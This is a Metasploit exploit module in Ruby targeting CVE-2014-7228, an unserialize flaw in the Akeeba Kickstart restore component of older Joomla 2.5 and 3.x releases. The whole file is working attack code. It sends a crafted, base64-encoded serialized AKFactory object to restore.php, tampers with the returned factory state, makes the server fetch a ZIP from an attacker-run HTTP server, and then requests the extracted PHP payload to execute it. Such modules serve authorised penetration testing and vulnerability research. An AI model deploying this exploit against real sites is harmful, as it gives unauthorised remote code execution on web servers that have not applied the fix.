##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/zip'
require 'json'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Joomla Akeeba Kickstart Unserialize Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in Joomla! through 2.5.25, 3.2.5 and earlier
        3.x versions and 3.3.0 through 3.3.4 versions. The vulnerability affects the Akeeba
        component, which is responsible for Joomla! updates. Nevertheless it is worth to note
        that this vulnerability is only exploitable during the update of the Joomla! CMS.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Johannes Dahse',               # Vulnerability discovery
          'us3r777 <us3r777[at]n0b0.so>'  # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2014-7228' ],
          [ 'URL', 'http://developer.joomla.org/security/595-20140903-core-remote-file-inclusion.html'],
          [ 'URL', 'https://www.akeebabackup.com/home/news/1605-security-update-sep-2014.html'],
          [ 'URL', 'http://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/'],
        ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Joomla < 2.5.25 / Joomla 3.x < 3.2.5 / Joomla 3.3.0 < 3.3.4', {} ]
        ],
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'Privileged'     => false,
      'DisclosureDate' => "Sep 29 2014",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to Joomla', '/joomla']),
        OptInt.new('HTTPDELAY',    [false, 'Seconds to wait before terminating web server', 5])
      ], self.class)
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', 'restoration.php')
    )

    if res && res.code == 200
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def primer
    srv_uri = "#{get_uri}/#{rand_text_alpha(4 + rand(3))}.zip"

    php_serialized_akfactory = 'O:9:"AKFactory":1:{s:18:"' + "\x00" + 'AKFactory' + "\x00" + 'varlist";a:2:{s:27:"kickstart.security.password";s:0:"";s:26:"kickstart.setup.sourcefile";s:' + srv_uri.length.to_s + ':"' + srv_uri + '";}}'
    php_filename = rand_text_alpha(8 + rand(8)) + '.php'

    # Create the zip archive
    print_status("Creating archive with file #{php_filename}")
    zip_file = Rex::Zip::Archive.new
    zip_file.add_file(php_filename, payload.encoded)
    @zip = zip_file.pack

    # First step: call restore to run _prepare() and get an initialized AKFactory
    print_status("#{peer} - Sending PHP serialized object...")
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', 'restore.php'),
      'vars_get'  => {
        'task'    => 'stepRestore',
        'factory' => Rex::Text.encode_base64(php_serialized_akfactory)
      }
    })

    unless res && res.code == 200 && res.body && res.body =~ /^###\{"status":true.*\}###/
      print_status("#{res.code}\n#{res.body}")
      fail_with(Failure::Unknown, "#{peer} - Unexpected response")
    end

    # Second step: modify the currentPartNumber within the returned serialized AKFactory
    json = /###(.*)###/.match(res.body)[1]
    begin
      b64encoded_prepared_factory = JSON.parse(json)['factory']
    rescue JSON::ParserError
      fail_with(Failure::Unknown, "#{peer} - Unexpected response, cannot parse JSON")
    end

    prepared_factory = Rex::Text.decode_base64(b64encoded_prepared_factory)
    modified_factory = prepared_factory.gsub('currentPartNumber";i:0', 'currentPartNumber";i:-1')

    print_status("#{peer} - Sending initialized and modified AKFactory...")
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', 'restore.php'),
      'vars_get'  => {
        'task'    => 'stepRestore',
        'factory' => Rex::Text.encode_base64(modified_factory)
      }
    })

    unless res && res.code == 200 && res.body && res.body =~ /^###\{"status":true.*\}###/
      fail_with(Failure::Unknown, "#{peer} - Unexpected response")
    end

    register_files_for_cleanup(php_filename)

    print_status("#{peer} - Executing payload...")
    send_request_cgi({
      'uri' => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', php_filename)
    }, 2)

  end

  def exploit
    begin
      Timeout.timeout(datastore['HTTPDELAY']) { super }
    rescue Timeout::Error
      # When the server stops due to our timeout, this is raised
    end
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    if @zip && request.uri =~ /\.zip$/
      print_status("Sending the ZIP archive...")
      send_response(cli, @zip, { 'Content-Type' => 'application/zip' })
      return
    end

    print_status("Sending not found...")
    send_not_found(cli)
  end

end